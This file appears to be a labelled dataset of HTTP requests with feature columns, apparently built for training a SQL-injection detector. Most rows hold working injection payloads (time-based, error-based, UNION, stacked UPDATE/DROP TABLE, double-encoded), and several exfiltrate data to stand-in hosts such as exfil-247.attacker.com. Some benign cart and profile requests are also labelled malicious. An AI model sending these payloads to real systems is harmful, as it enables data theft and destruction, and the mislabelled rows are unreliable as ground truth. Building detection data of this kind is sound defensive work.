RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
GET,/rest/products/search,query=%27+and+%27x%27%3D%27X%27+anD+sLEEp%285%29--,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,260,21,50,0,1,28,15,8,0,0.2113,2,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/1,,HTTP/1.1,curl/8.6.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 3}",,malicious,sqli,198,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/3' AND TRUE AND SLEEP(6) ,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,249,40,0,0,0,0,6,0,0,0.15,2,26,False,False,False,False,3,True,False,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+AND+TRUE+AND+SLEEP%286%29+,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,249,16,33,0,1,24,11,3,0,0.2245,2,30,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/1' AND TRUE AND SLEEP(6),,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,222,39,0,0,0,0,6,0,0,0.1538,2,26,False,False,False,False,3,False,False,False,False,4,20,Tuesday
GET,/rest/products/1,id=%27+AND+TRUE+AND+SLEEP%286%29%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,227,16,35,0,1,24,11,4,0,0.2157,2,31,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%2527%253b%2520%2569%256e%2573%2545%2552%2574%2520%2549%256e%2554%256f%2520%254f%2572%2544%2545%2572%2573%2520%2528%2545%256d%2541%2549%256c%2529%2520%2556%2541%256c%2555%2565%2553%2520%2528%2527%2566%2555%255a%255a%255f%2554%2545%2553%2574%255f%2535%2538%2535%2527%2529%253b%252d%252d,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,510,16,288,0,1,171,60,57,57,0.1974,0,26,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%2522%2Band%2BTrue%2523,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,219,21,29,0,1,15,7,4,2,0.14,0,22,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,351,21,97,0,1,62,21,14,0,0.178,2,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,357,21,96,0,1,59,22,16,0,0.188,2,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AnD+trUe+aNd+WaiTfor+DElAy+%270%3A0%3A3%27--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,314,21,53,0,1,38,14,5,0,0.1892,0,32,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/11,,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,155,18,0,0,0,0,4,0,0,0.2222,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/7,id=%22+AND+TRUE%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,225,16,21,0,1,12,8,3,0,0.2162,0,24,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/19,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 2}",,malicious,sqli,314,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/9,id=%2527%2BAND%2B%2528SELECT%2BLOAD_FILE%2528CONCAT%2528%2527%255C%255C%2527%252C%2528SELECT%2Bdatabase%2528%2529%2529%252C%2527.exfil-247.attacker.com%255Cabc%2527%2529%2529%2529--,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,420,16,181,0,1,130,31,24,20,0.1574,5,41,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%2522%2BOR%2B40%253D44--,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,238,21,29,0,1,16,7,4,2,0.14,0,24,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/16,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,255,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/1,id=%2527%2520%2541%254E%2544%2520%2528%2553%2545%254c%2545%2543%2554%2520%2555%2550%2544%2541%2554%2545%2558%254D%254c%2528%2531%252c%2543%254F%254E%2543%2541%2554%2528%2530%2578%2537%2565%252C%2528%2564%2561%2574%2561%2562%2561%2573%2565%2528%2529%2529%252C%2530%2578%2537%2565%2529%2529%2529%252d%252d,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,488,16,303,0,1,180,63,60,60,0.1975,0,27,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2BAnD%2B42%253D80%2BAND%2BwaitFor%2BDeLAY%2B%25270%253A0%253A4%2527%2523,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,328,21,83,0,1,52,16,13,7,0.1538,0,31,False,False,False,False,3,True,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/6,,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,213,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,query=%27+AND+39%3D34+AND+WAITFOR+DELAY+%270%3A0%3A6%27%2F%2A,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,304,21,61,0,1,39,17,8,0,0.2073,0,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%2527%2BAND%2B%2528SELECT%2BEXTRACTVALUE%25281%252CCONCAT%25280x7e%252C%2528version%2528%2529%2529%252C0x7e%2529%2529%2529--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,319,16,127,0,1,90,20,17,14,0.1399,2,39,False,False,False,True,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/13,,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,270,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user5@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,339,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
DELETE,/rest/cart/item/9,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,227,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,308,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,345,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,308,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,path=%27+aND+%27Z%27%3D%27z%27+And+wAiTfoR+deLay+%270%3A0%3A7%27--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,303,21,66,0,1,41,19,10,0,0.2184,0,33,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,283,21,86,0,1,55,21,14,0,0.1963,2,36,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,290,21,92,0,1,59,21,14,0,0.1858,2,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,21,96,0,1,59,21,14,0,0.1795,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%27+AND+30%3D31+AND+WAITFOR+DELAY+%270%3A0%3A7%27%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,318,21,57,0,1,38,16,7,0,0.2051,0,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%27%3B+UPDATE+orders+SET+price%3D%274809%27+WHERE+id%3D1%3B%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,331,21,70,0,1,47,18,9,0,0.1978,0,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-254.attacker.com%2F%27%7C%7Cversion%28%29%29%23,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,340,21,103,0,1,68,23,14,0,0.1855,0,47,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+and+19%3D91+anD+sLeEp%283%29+,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,225,21,35,0,1,25,12,4,0,0.2143,2,26,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,346,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
DELETE,/rest/cart/item/5,,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,269,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/5,id=%22+AND+TRUE%23,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,267,16,18,0,1,11,7,2,0,0.2059,0,24,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+%40%40hostname%29%2C%27.exfil-169.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,390,16,134,0,1,89,32,21,0,0.2133,5,47,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/9,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 3}",,malicious,sqli,330,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/7,id=%27+AND+57%3D95+AND+WAITFOR+DELAY+%270%3A0%3A5%27%2F%2A,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,263,16,58,0,1,39,17,8,0,0.2297,0,32,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,306,16,102,0,1,67,23,16,0,0.1949,2,38,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%253b%2520%2555%2550%2544%2541%2554%2545%2520%2570%2572%256f%2564%2575%2563%2574%2573%2520%2553%2545%2554%2520%2570%2572%2569%2563%2565%253d%2527%2539%2539%2533%2538%2527%2520%2557%2548%2545%2552%2545%2520%2569%2564%253d%2531%253b%252d%252d,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,494,21,250,0,1,147,52,49,49,0.1919,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%2527%2BAND%2B63%253D63%2BANd%2BWaitFOR%2BDelaY%2B%25270%253A0%253A6%2527%2B,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,331,16,79,0,1,50,16,13,6,0.1684,0,31,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%2527%2BUNION%2BSELECT%2BNULL%252C%2BNULL%252C%2Bdatabase%2528%2529%252C%2BNULL%252C%2BNULL%252C%2BNULL%2B,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,312,21,115,0,1,72,20,17,8,0.1471,2,32,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AND+TRUE+AND+SLEEP%287%29+,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,241,21,35,0,1,24,11,3,0,0.1964,2,29,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/6,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-182.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,393,16,130,0,1,85,32,21,0,0.2192,5,43,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%2527%253b%2520%2555%2550%2544%2541%2554%2545%2520%2563%256f%256e%2566%2569%2567%2520%2553%2545%2554%2520%2570%2572%2569%2563%2565%253d%2527%2534%2538%2537%2531%2527%2520%2557%2548%2545%2552%2545%2520%2569%2564%253d%2531%253b%252d%252d,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,451,21,242,0,1,141,50,47,47,0.1901,0,26,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%2527%2520%2541%254e%2544%2520%2528%2553%2565%254c%2565%2543%2574%2520%254c%256f%2561%2544%255f%2566%2569%256c%2565%2528%2543%254f%256e%2563%2541%2554%2528%2527%255c%255c%2527%252c%2528%2573%2545%254c%2545%2563%2554%2520%2540%2540%2548%256f%2553%2574%254e%2541%256d%2565%2529%252c%2527%252e%2565%2558%2546%2569%254c%252d%2536%2537%2537%252e%2541%2554%2554%2561%2543%256b%2545%2572%252e%2543%256f%254d%255c%2561%2562%2563%2527%2529%2529%2529%2523,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,633,16,448,0,1,267,92,89,89,0.1983,0,25,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/10,id=%27+AND+%27c%27%3D%27c%27%23,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,225,17,31,0,1,14,12,7,0,0.25,0,22,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,355,21,98,0,1,63,22,15,0,0.1849,2,38,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/5,id=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+database%28%29%2C+NULL--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,332,16,76,0,1,57,19,8,0,0.2065,2,31,False,False,False,True,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/1,,HTTP/1.1,curl/8.6.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,sqli,198,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+%40%40hostname%29%2C%27.exfil-163.attacker.com%5Cabc%27%29%29%29%23,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,324,21,134,0,1,89,32,21,0,0.2065,5,47,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/9,id=%27+OR+%27s%27%3D%27s%27%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,249,16,33,0,1,14,13,8,0,0.2653,0,23,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+UNION+SELECT+NULL%2C+NULL%2C+user%28%29%2C+NULL%2C+NULL--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,315,16,64,0,1,47,17,7,0,0.2125,2,29,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+version%28%29%29%2C%27.exfil-365.attacker.com%5Cabc%27%29%29%29+,HTTP/1.1,Wget/1.21.3,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,270,21,133,0,1,88,32,20,0,0.2078,5,45,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%2527%253b%2520%2544%2552%254f%2550%2520%2554%2541%2542%254c%2545%2520%2570%2572%256f%2564%2575%2563%2574%2573%253b%2523,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,376,21,122,0,1,72,27,24,24,0.1888,0,25,False,False,False,False,3,False,True,False,False,4,20,Tuesday
